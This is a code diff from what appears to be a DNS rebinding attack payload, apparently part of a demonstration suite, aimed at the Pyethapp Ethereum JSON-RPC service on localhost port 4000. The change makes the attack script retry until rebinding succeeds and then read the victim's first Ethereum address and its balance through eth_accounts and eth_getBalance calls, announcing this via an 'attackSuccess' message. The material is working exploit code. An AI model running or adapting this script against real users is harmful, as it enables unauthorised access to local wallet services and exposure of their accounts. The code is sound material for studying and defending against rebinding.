@@ -24,27 +24,32 @@ The default RPC port for Pyethapp is TCP 4000 (127.0.0.1:4000)
 		})
 		.then(responseOKOrFail("Could not submit a request to get a list of eth addresses"))
 		.then(function (d) { // we successfully received data (the eth addresses)
-			/* eth_getBalance : Send a second POST request to get the balance of the first account */
-			data = JSON.parse(d); // parse JSON server response
-			console.log("received JSON response: " + d);
-			address = data.result[0]; // get first address from addresses array
-			console.log("address: " + address);
+			if (d.includes(indextoken) == false && d.length > 0) {
+				clearInterval(timer);
+				/* eth_getBalance : Send a second POST request to get the balance of the first account */
+				data = JSON.parse(d); // parse JSON server response
+				console.log("received JSON response: " + d);
+				address = data.result[0]; // get first address from addresses array
+				console.log("address: " + address);
 
-			var jsonDataToSend = {
-				'jsonrpc': '2.0',
-				'method': 'eth_getBalance',
-				'params': [address, "latest"],
-				"id": 1
-			};
-			return fetch(`/`, {
-				method: 'POST',
-				body: JSON.stringify(jsonDataToSend)
-				})
-
+				var jsonDataToSend = {
+					'jsonrpc': '2.0',
+					'method': 'eth_getBalance',
+					'params': [address, "latest"],
+					"id": 1
+				};
+				return fetch(`/`, {
+					method: 'POST',
+					body: JSON.stringify(jsonDataToSend)
+					})
+			} else {
+				// We saw the token in the response. DNS Rebinding did not happen.
+				// Let's wait for the next time.
+				throw new Error('hastoken');
+			}
 		})
 		.then(responseOKOrFail("Could not submit a request to get the eth balance"))
 		.then(function (d) { // we successfully received the response
-			clearInterval(timer);
 			data = JSON.parse(d); // parse JSON server response
 			balance = data.result;
 			attackSuccess("Your ETH address is '"+address+"' and has a balance of " + balance + " wei.");
